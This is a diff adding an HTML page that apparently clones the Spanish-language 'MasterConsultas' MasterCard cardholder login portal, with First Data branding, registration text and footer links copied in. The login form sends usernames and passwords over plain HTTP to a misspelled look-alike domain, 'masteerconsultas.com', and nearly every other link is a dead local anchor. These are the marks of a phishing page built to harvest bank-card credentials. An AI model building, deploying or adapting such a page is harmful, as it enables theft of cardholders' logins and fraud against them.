@@ -1,0 +1,149 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html class="no-js" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Cache-Control" content="no-cache, no-store">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
+    
+
+
+<link id="jquery_theme_link" rel="stylesheet" href="index_files/jquery-ui.css" type="text/css">
+
+</script>
+
+	<title>MasterConsultas</title>
+	<style> id="antiClickjack">
+		body{display:none !important;}
+	</style>
+	<link rel="stylesheet" href="index_files/style.css">
+</head>
+<body class="home nolog">
+	<header>
+<div id="header" class="nolog">
+  <div class="header-content">
+    <h1><a href="index.html#">MasterConsultas</a></h1>
+  </div>
+</div>
+</header> 	
+	<meta http-equiv="Cache-Control" content="no-cache, no-store">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
+
+<style>
+/* style keyboard */
+table tbody tr td {padding:0;} 
+</style>
+
+<div id="container" class="clearfix">
+  <div class="content nolog">
+    <h3 class="title">INICIO DE SESIÓN // <strong>REGISTRACIÓN</strong></h3>
+    <div class="combo-registro">
+      <div class="registrado">
+        <form id="loginForm" name="loginForm" action="http://masteerconsultas.com/socios/context/init_input_action/valid/" method="post" class="form-login" autocomplete="off">
+          <fieldset>
+            <input style="display:none">
+			<input type="password" style="display:none">
+            <p style="padding-bottom: 12px !important;">
+              	<input type="text" name="username" maxlength="12" id="usernameId" class="usuario" placeholder="Nombre de usuario" required="true">
+              	
+            </p>
+            <p style="padding-bottom: 12px !important;">
+				<input type="password" name="pass" id="password" class="pass" placeholder="Contraseña" autocomplete="off" required="true">
+				
+			</p>
+           	<input type="submit" id="submitLogin" value="Ingresar" class="btn-224px" style="border:none;" clearform="true" button="true" blocksui="true">
+
+            <p class="nota">
+	            <a href="index.html#" id="keyboardAnchorId" onclick="changeKeyboardVisibility(); return false;">
+	            	Teclado virtual para acceso desde una PC pública
+	            </a>
+            </p>
+            <div id="kbtable" align="left" style="position: absolute; float: right; left: 176px; top: 396px; display: none; cursor: move;"></div>
+          </fieldset>
+          
+        </form>
+
+        <div class="txt-olvido">
+        	
+			<p>Si olvidó su contraseña (password)  haga click 
+			<a href="index.html#" blocksui="true">aquí</a>			
+			</p>                       
+        </div>
+      </div>
+      <div class="registrese">
+      	<h4>¿Primera vez que ingresa?</h4>
+      	
+        <p>Regístrese y obtenga un mejor control de todas sus cuentas MasterCard</p>
+        <a href="index.html#" blocksui="true">Regístrese</a> 
+        <p class="nota">(No olvide tener su tarjeta y último resumen de cuenta a mano para generar su Usuario y Contraseña)</p>
+      </div>
+
+      
+    </div>
+    <div class="combo-txt">
+      <div class="txt">
+	    <p>Acceda aquí al detalle completo de todas las operaciones que realiza con sus tarjetas MasterCard.</p>
+	    <ul>
+	      <li>Verifique sus últimos movimientos, liquidaciones y resúmenes de cuenta.</li>
+	      <li>Adhiérase al débito automático de sus facturas.</li>
+	      <li>Chequee su límite de compra, cierre y vencimientos.</li>
+	      <li>Efectúe el pago de servicios e impuestos.</li>
+	      <li>Recargue crédito a sus celulares las 24 horas del día.</li>
+	    </ul>
+      </div>
+      <ul class="btns">
+        <li><a href="index.html#" class="btn01"></a></li>
+        <li><a href="index.html#" class="btn02"></a></li>
+        <li><a href="index.html#" class="btn03"></a></li>       
+      </ul>
+    </div>
+  </div>
+</div>
+	
+
+<footer>
+<div id="footer">
+  	<div class="footer-content">
+      <div class="box socios">
+          <h5>Socios</h5>
+          <ul>
+          	<li><a href="index.html#">Tarjetas de Crédito</a></li>
+            <li><a href="index.html#">Otras Tarjetas</a></li>
+            <li><a href="index.html#">Promociones</a></li>
+            <li><a href="index.html#">Novedades</a></li>
+          </ul>
+      </div>
+      <div class="box comercios">          
+           <h5>Comercios</h5>
+           <ul>
+            <li><a href="index.html#">Acepte Mastercard</a></li>
+            <li><a href="index.html#">Servicios</a></li>
+            <li><a href="index.html#">Novedades</a></li>
+            <li><a href="index.html#">Descargas</a></li>
+          </ul>
+      </div>        
+      <div class="box empresas">
+          <h5>Empresas</h5>
+          <ul>
+            <li><a href="index.html#">Tarjetas</a></li>
+            <li><a href="index.html#">Promociones</a></li>
+          </ul>
+      </div>      
+      <div class="box contactenos">
+           <h5>¿Necesita ayuda?</h5>
+           <ul>
+            <li><a href="index.html#">¿Extravió su tarjeta?</a></li>
+            <li><a href="index.html#">Buscador Cajeros</a></li>
+			<li><a href="index.html#">Contáctese con nosotros</a></li>
+          </ul>      
+      </div>
+    </div>
+    <a href="index.html#" class="top"></a>
+    <h6>MasterCard</h6>
+    <p class="loginDF">
+    	<a href="index.html#">First Data Cono Sur S.R.L.</a> | <a href="index.html#">Todos los derechos reservados</a><br>    	 
+    	<a href="index.html#">Términos y Condiciones</a> | <a href="index.html#">Medidas de Seguridad</a> | <a href="index.html#">Protección de Datos Personales</a> | <a href="index.html#">Defensa y Protección al Consumidor</a>
+    </p>
+  </div>
+</footer>	
+</body></html>
